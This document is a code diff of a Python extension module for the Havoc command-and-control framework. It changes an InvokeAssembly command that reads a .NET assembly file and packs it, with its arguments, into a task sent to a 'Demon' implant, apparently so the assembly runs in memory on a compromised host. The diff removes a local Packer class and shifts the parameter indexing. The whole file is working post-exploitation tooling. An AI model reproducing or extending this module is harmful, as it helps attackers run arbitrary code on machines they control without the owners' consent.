@@ -1,40 +1,5 @@
 
 from havoc import Demon, RegisterCommand
-from struct import pack, calcsize
-
-class Packer:
-    def __init__(self):
-        self.buffer : bytes = b''
-        self.size   : int   = 0
-
-    def getbuffer(self):
-        return pack("<L", self.size) + self.buffer
-
-    def addshort(self, short):
-        self.buffer += pack("<h", short)
-        self.size += 2
-
-    def addint(self, dint):
-        self.buffer += pack("<i", dint)
-        self.size += 4
-
-    def addstr(self, s):
-        if isinstance(s, str):
-            s = s.encode("utf-8")
-        fmt = "<L{}s".format(len(s) + 1)
-        self.buffer += pack(fmt, len(s)+1, s)
-        self.size += calcsize(fmt)
-
-    def addBytes(self, s, b): 
-        fmt = "<L{}s".format(s)
-        self.buffer += pack(fmt, s, str(b))
-        self.size += calcsize(fmt)
-
-    def addWstr(self, s):
-        s = s.encode("utf-16_le")
-        fmt = "<L{}s".format(len(s) + 2)
-        self.buffer += pack(fmt, len(s)+2, s)
-        self.size += calcsize(fmt)
 
 def InvokeAssembly( demonID, *param ):
     TaskID   : str    = None
@@ -55,15 +20,15 @@ def InvokeAssembly( demonID, *param ):
         return
 
     try:
-        Assembly = open( param[ 1 ], 'rb' )
+        Assembly = open( param[ 0 ], 'rb' )
 
         packer.addstr( "DefaultAppDomain" )
         packer.addstr( "v4.0.30319" )
         packer.addstr( str(Assembly.read()) )
-        packer.addstr( " " + ''.join( param[ 2: ] ) )
+        packer.addstr( " " + ''.join( param[ 1: ] ) )
 
     except OSError:
-        demon.ConsoleWrite( demon.CONSOLE_ERROR, "Failed to open assembly file: " + param[ 1 ] )
+        demon.ConsoleWrite( demon.CONSOLE_ERROR, "Failed to open assembly file: " + param[ 0 ] )
         return
 
     arg = packer.getbuffer() 
